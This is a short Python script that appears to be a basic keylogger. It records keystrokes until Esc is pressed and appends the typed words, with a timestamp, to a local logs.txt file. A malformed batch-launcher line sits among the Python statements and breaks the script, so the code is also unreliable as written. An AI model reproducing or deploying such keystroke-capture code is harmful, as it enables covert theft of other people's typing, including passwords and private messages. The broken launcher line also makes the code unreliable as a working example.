import sys
import keyboard
import datetime


@echo off & python - x "%~f0" % * & goto: eof
gen = keyboard.get_typed_strings(keyboard.record(until='Esc'))
l = []
for i in gen:
    l.append(i)

s = l[0]
l = s.split()
file = open("logs.txt", "a")
today = datetime.datetime.now().strftime("%I:%M%p on %B %d, %Y\n")
file.write(today)
for i in l:
    file.write(i + "\n")
file.close()
